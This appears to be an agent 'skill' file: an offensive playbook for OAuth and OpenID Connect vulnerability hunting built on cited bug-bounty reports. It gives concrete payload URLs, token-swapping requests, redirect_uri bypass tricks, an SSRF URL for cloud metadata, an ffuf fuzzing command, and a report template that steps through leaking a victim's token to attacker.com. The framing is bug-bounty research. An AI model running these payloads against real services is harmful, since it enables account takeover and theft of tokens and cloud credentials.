---
name: oauth
description: "OAuth 2.0 and OpenID Connect hunting: redirect URI manipulation, state/nonce bypass, and token leakage."
---

# SKILL: OAuth Vulnerability Hunting [OAUTH]

Expert playbook for exploiting OAuth misconfigurations, token smuggling, and account takeovers based on top-tier HackerOne reports from Uber, Shopify, and Rockstar Games.

## 1. Core Patterns

### Pattern 1: Fragment Smuggling via Redirect Chaining
*   **Architectural Cause:** Chaining multiple trusted-domain redirects where the browser preserves the `#access_token` fragment across 302 hops until it hits an open redirect or Referer-leaking endpoint.
*   **H1 Report:** #202781 (Uber) - **$7,500**
*   **Exact Payload/Endpoint:** 
    `https://www.facebook.com/v2.8/dialog/oauth?client_id=1550938858535035&redirect_uri=https://auth.uber.com/login?next_url=https://login.uber.com/logout&response_type=token`
    *Note: The fragment persists from Facebook -> auth.uber.com -> login.uber.com/logout -> attacker.com.*

### Pattern 2: Early Session Grant (Pre-Auth Bypass)
*   **Architectural Cause:** The application grants an authenticated session at the *initiation* phase of the OAuth flow rather than waiting for the final token exchange/validation.
*   **H1 Report:** #554992 (Shopify) - **$15,000**
*   **Exact Payload/Endpoint:** 
    `POST /install_app?store_id=[VICTIM_STORE_ID]`
    *Intercept the installation request and swap your own ID for the victim's. If the app redirects to the dashboard immediately, it's vulnerable.*

### Pattern 3: OAuth App ID Mis-validation (Token Swapping)
*   **Architectural Cause:** Backend accepts an `access_token` for login but fails to verify if that token was issued specifically for the target application's `client_id`.
*   **H1 Report:** #314808 (Reverb) - **$10,000+**
*   **Exact Payload/Endpoint:** 
    `POST /api/v1/login/facebook`
    `{"access_token": "TOKEN_FROM_ATTACKER_APP"}`
    *Generate a valid Facebook token using your own malicious app and submit it to the victim app's login endpoint.*

### Pattern 4: Code Theft via Referer Leakage
*   **Architectural Cause:** The OAuth callback page includes external assets (images/scripts) or triggers a client-side redirect, leaking the `code` or `token` in the `Referer` header to a third-party domain.
*   **H1 Report:** #131202 (Rockstar Games) - **Critical**
*   **Exact Payload/Endpoint:** 
    `https://socialclub.rockstargames.com/oauth/callback?code=CODE`
    *The page loads an image from an attacker-controlled server: `<img src="https://attacker.com/log.php">`.*

### Pattern 5: Blind SSRF via Metadata Fetching
*   **Architectural Cause:** Server-side fetching of OAuth provider metadata (OpenID Connect) or client icons based on user-supplied URLs without proper filtering.
*   **H1 Report:** #158399 (GitLab) - **$4,000**
*   **Exact Payload/Endpoint:** 
    `https://gitlab.com/oauth/jira/authorize?url=http://169.254.169.254/latest/meta-data/`

---

## 2. Recon Checklist

*   **JS File Targets:**
    *   Search for `client_id`, `redirect_uri`, `response_type`, `grant_type`.
    *   Look for `window.postMessage` listeners that handle tokens.
*   **Parameter Names:** `redirect_uri`, `state`, `nonce`, `code`, `access_token`, `id_token`.
*   **Hidden Endpoint Discovery:**
    *   Check `/.well-known/openid-configuration`.
    *   Fuzz for `oauth/authorize`, `oauth/token`, `oauth/callback`.
*   **Burp Extensions:** 
    *   **OAuth Hacker:** Specifically designed to find `redirect_uri` bypasses.
    *   **GAP (Get All Params):** For finding hidden OAuth parameters.
*   **ID Enumeration Types:** Check if `client_id` or `store_id` are sequential or easily guessable.

---

## 3. ID/Target Discovery

*   **App Directory Harvest:** Browse the "Apps" or "Integrations" section of a platform to find valid `client_id` values.
*   **JS Source Leakage:** Search GitHub or public JS files for `client_id` and `client_secret` (if mistakenly included in client-side code).
*   **URL History:** Check WayBack Machine for previous OAuth callback URLs to see historical `redirect_uri` whitelists.

---

## 4. Bypass Techniques

1.  **Path Traversal in `redirect_uri`:** `https://target.com/oauth/callback?redirect_uri=https://trusted.com/callback/../../attacker.com`.
2.  **IDN Homograph Attacks:** Use visually similar characters (e.g., `target.com` vs `targеt.com`).
3.  **Loose Regex Bypass:** If the whitelist is `.*target.com`, use `attacker-target.com`.
4.  **Fragment Smuggling:** Use a known open redirect on a trusted domain to "smuggle" the `#token` to your site (#202781).
5.  **Parameter Injection:** Inject extra `redirect_uri` parameters (e.g., `&redirect_uri=attacker.com`) to see if the server picks the second one.
6.  **`response_type` Swapping:** If `code` is protected, try `response_type=token` or `id_token` to see if implicit flow is enabled.

---

## 5. High-Value Targets

1.  **Authentication Callbacks:** `/auth/callback`, `/login/oauth` (Highest payout: ATO).
2.  **Internal SSO Gates:** `/internal/login`, `/admin/auth`.
3.  **App Installation Flows:** `/apps/install`, `/oauth/authorize` (#554992).
4.  **Developer Portals:** Endpoints allowing custom `redirect_uri` registration.

---

## 6. Chaining Playbook

*   **Open Redirect + OAuth Leak:** `OAuth Callback` $\rightarrow$ `Open Redirect` $\rightarrow$ `Attacker Server` (Token Smuggling).
*   **XSS + OAuth Theft:** Use XSS on a trusted subdomain to read the `localStorage` or `sessionStorage` where OAuth tokens are stored.
*   **CSRF + OAuth Account Binding:** Missing `state` parameter $\rightarrow$ Force victim to bind their account to the attacker's OAuth session (ATO).
*   **SSRF + Cloud Metadata:** Use OAuth metadata fetching to hit `169.254.169.254` and steal IAM roles (#158399).

---

## 7. Variant-Specific: Token Smuggling

The highest-paying OAuth variant is **Token Smuggling via Fragment Persistence**.
*   **The Flaw:** Browsers do not clear the `#fragment` during 302/301 redirects unless the redirect URL itself contains a fragment.
*   **The Exploit:** Find any endpoint on a trusted domain that redirects (even if it's a safe logout or help page). Direct the OAuth flow to that page. The fragment containing the `#access_token` will travel through every hop until you find a way to leak it (via `Referer`, `Location`, or `window.name`).

---

## 8. Automation

*   **Burp Intruder:** 
    *   **Attack Type:** Sniper.
    *   **Payloads:** Fuzz the `redirect_uri` with various path traversal, homograph, and open redirect payloads.
*   **FFUF Command:**
    ```bash
    ffuf -u "https://target.com/oauth/authorize?client_id=ID&redirect_uri=FUZZ" -w oauth_bypass_list.txt -mr "error|redirect"
    ```
*   **Response Diffing:** Compare the `Location` header in responses when using different `redirect_uri` variations. Look for cases where the attacker domain is reflected.

---

## 9. Triage

*   **Verification:** You MUST show that you can log into a victim account or steal a token that works on a victim account. Screenshots of a reflected `redirect_uri` are often marked as "Informational" or "Low" if no token is stolen.
*   **Severity Scoring:**
    *   **Critical ($10k+):** Full Account Takeover (ATO) with no user interaction (#554992).
    *   **High ($3k-$7k):** ATO with minimal user interaction (e.g., clicking a link) (#202781).
    *   **Medium ($500-$2k):** Token theft for low-privileged apps, limited scope escalation.

---

## 10. Report Template

### Title: [CRITICAL] Full Account Takeover via OAuth Token Smuggling on [ENDPOINT]

**Summary:**
A misconfiguration in the OAuth flow allowed for token smuggling through a series of redirects, leading to a full account takeover of any user who clicks a malicious link.

**Description:**
The OAuth implementation on `[AUTHORIZE_ENDPOINT]` fails to strictly validate the `redirect_uri`. By chaining this with an open redirect on `[REDIRECT_ENDPOINT]`, the `#access_token` fragment is preserved and leaked to an attacker-controlled domain.

**Steps to Reproduce:**
1. Construct the following malicious OAuth URL:
   `https://[AUTHORIZE_ENDPOINT]?client_id=[ID]&redirect_uri=https://[TRUSTED_DOMAIN]/[REDIRECT_PATH]?next=https://attacker.com/&response_type=token`
2. Send the link to the victim.
3. Once the victim authorizes the app, the token is appended to the URL and passed through the redirect chain.
4. Capture the token on the attacker's server via `Referer` or JavaScript.

**Impact:**
Complete takeover of the victim's account, allowing access to all PII and platform features.

**Reference:**
Pattern based on HackerOne report #202781.
